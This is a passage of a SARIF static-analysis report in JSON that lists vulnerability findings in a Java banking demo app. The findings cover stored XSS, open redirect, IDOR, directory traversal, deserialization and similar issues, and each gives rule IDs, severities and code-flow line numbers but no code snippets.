                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 25
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 301
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "f5677d7f2db6c7e85002a01a93a8f9e49b011f37d0bf88e298dc280c9ea78da9"
          },
          "ruleId": "stored-xss",
          "ruleIndex": 3
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via `phoneNumber` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via phoneNumber in CustomerController.debug"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 301
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 289
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 297
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 20
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 30
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 301
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "bc89bb4ab9715a647fdb6b973221aaffe16a1f539639c1c35a64985c022c5673"
          },
          "ruleId": "stored-xss",
          "ruleIndex": 3
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via `customerId` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via customerId in CustomerController.debug"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 301
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 281
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 23
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 301
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "b24300145408f6fd8fe517e5c6a453fdd1e54d52d9792801fd114f46987bcefc"
          },
          "ruleId": "stored-xss",
          "ruleIndex": 3
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via `tin` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-controlled, Sensitive Data Stored in Database via tin in CustomerController.debug"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 301
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 288
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 297
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 20
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 29
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 301
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "85e236afb4d0a3864c7c2cf69138783007af703da461c2cd49494182bfd836d4"
          },
          "ruleId": "stored-xss",
          "ruleIndex": 3
        },
        {
          "message": {
            "markdown": "Open Redirect: Attacker-Controlled Data is Used in HTTP Redirects via `request` in `CustomerController.createCustomer`",
            "text": "Open Redirect: Attacker-Controlled Data is Used in HTTP Redirects via request in CustomerController.createCustomer"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 350
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 344
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 350
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "cb85b5411473a1117b0e498ed7fe9237cf84e83015ac44d97d92afcf85f5fdcb"
          },
          "ruleId": "open-redirect",
          "ruleIndex": 4
        },
        {
          "message": {
            "markdown": "Open Redirect: Attacker-Controlled Data is Used in HTTP Redirects via `request` in `CustomerController.debug`",
            "text": "Open Redirect: Attacker-Controlled Data is Used in HTTP Redirects via request in CustomerController.debug"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 303
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 291
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 304
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 303
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "64beea93d17e3f4f97daf549cd64636777cf5e02375f9adb5b567aefec61344d"
          },
          "ruleId": "open-redirect",
          "ruleIndex": 4
        },
        {
          "message": {
            "markdown": "Log Forging: Attacker-controlled Data is Written Directly to Log via `account` in `AccountController.createAccount`",
            "text": "Log Forging: Attacker-controlled Data is Written Directly to Log via account in AccountController.createAccount"
          },
          "level": "note",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 101
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Account.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "LOW",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 35
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 37
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 100
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Account.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 102
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Account.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 101
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Account.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "53f5729dbec59837a81800d00d9caaeeb8e4d3454500d9f2e3632cb8ac2a052f"
          },
          "ruleId": "log-forging-attacker",
          "ruleIndex": 5
        },
        {
          "message": {
            "markdown": "Insecure Direct Object Reference: Attacker-controlled Data Used Directly to Find Database Entry in `AccountController.getAccount` via `accountId` ",
            "text": "Insecure Direct Object Reference: Attacker-controlled Data Used Directly to Find Database Entry in AccountController.getAccount via accountId "
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 44
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 42
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 44
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "5a87f75d591529ae1def4be0ae84a52dea5ed0df878aeea48bcace36c548db5d"
          },
          "ruleId": "idor-db",
          "ruleIndex": 6
        },
        {
          "message": {
            "markdown": "Insecure Direct Object Reference: Attacker-controlled Data Used Directly to Find Database Entry in `AccountController.withdrawFromAccount` via `accountId` ",
            "text": "Insecure Direct Object Reference: Attacker-controlled Data Used Directly to Find Database Entry in AccountController.withdrawFromAccount via accountId "
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 58
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 57
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 58
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "a54ec61f10a3d293110128e153f02c26bbdb413ae419bc5fe393214d5f18a3c4"
          },
          "ruleId": "idor-db",
          "ruleIndex": 6
        },
        {
          "message": {
            "markdown": "Insecure Direct Object Reference: Attacker-controlled Data Used Directly to Find Database Entry in `AccountController.depositIntoAccount` via `accountId` ",
            "text": "Insecure Direct Object Reference: Attacker-controlled Data Used Directly to Find Database Entry in AccountController.depositIntoAccount via accountId "
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 49
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 48
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 49
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "ceacdb8b597c4f2d80da9275ef0badad53a4f01f5f1c7dad2a86a29d350b0e5c"
          },
          "ruleId": "idor-db",
          "ruleIndex": 6
        },
        {
          "message": {
            "markdown": "Insecure Direct Object Reference: Attacker-controlled Data Used Directly to Find Database Entry in `AccountController.addInterestToAccount` via `accountId` ",
            "text": "Insecure Direct Object Reference: Attacker-controlled Data Used Directly to Find Database Entry in AccountController.addInterestToAccount via accountId "
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 67
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 66
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 67
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AccountController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "4f1c62ef9b0fcf6a24e74a59a32bede6d80c2ada23b01b8ed58eab6d6cfcf53d"
          },
          "ruleId": "idor-db",
          "ruleIndex": 6
        },
        {
          "message": {
            "markdown": "Insecure Direct Object Reference: Attacker-controlled Data Used Directly to Find Database Entry in `CustomerController.getCustomer` via `customerId` ",
            "text": "Insecure Direct Object Reference: Attacker-controlled Data Used Directly to Find Database Entry in CustomerController.getCustomer via customerId "
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 120
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 113
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 120
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "5fd1239ee65410068ef193f9fb4e24c3cbb331e9a32016a0f352d0f077b9b321"
          },
          "ruleId": "idor-db",
          "ruleIndex": 6
        },
        {
          "message": {
            "markdown": "Timing Attack: Observable Timing Discrepancy in Comparison of Cryptographic Hashes in `CustomerController.saveSettings`",
            "text": "Timing Attack: Observable Timing Discrepancy in Comparison of Cryptographic Hashes in CustomerController.saveSettings"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 241
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 240
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 241
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "0e464871a773db714370e6373e7004caed3c21f7252f19a89226587587d5b874"
          },
          "ruleId": "hash-compare",
          "ruleIndex": 7
        },
        {
          "message": {
            "markdown": "Directory Traversal: Attacker-controlled Data Used in File Path via `request` in `CustomerController.saveSettings`",
            "text": "Directory Traversal: Attacker-controlled Data Used in File Path via request in CustomerController.saveSettings"
          },
          "level": "error",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 251
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "CRITICAL",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 220
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 229
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 230
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 236
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 248
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 251
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "1b5f4eb654852098ccaa4719675e9ce75a9a7cc06e5904488980a61938f39621"
          },
          "ruleId": "directory-traversal-http",
          "ruleIndex": 8
        },
        {
          "message": {
            "markdown": "Deserialization: Attacker-controlled Data Used in Unsafe Deserialization Function via `auth` in `AdminController.doPostLogin`",
            "text": "Deserialization: Attacker-controlled Data Used in Unsafe Deserialization Function via auth in AdminController.doPostLogin"
          },
          "level": "error",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 36
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AdminController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "CRITICAL",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 85
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AdminController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 91
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AdminController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 31
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AdminController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
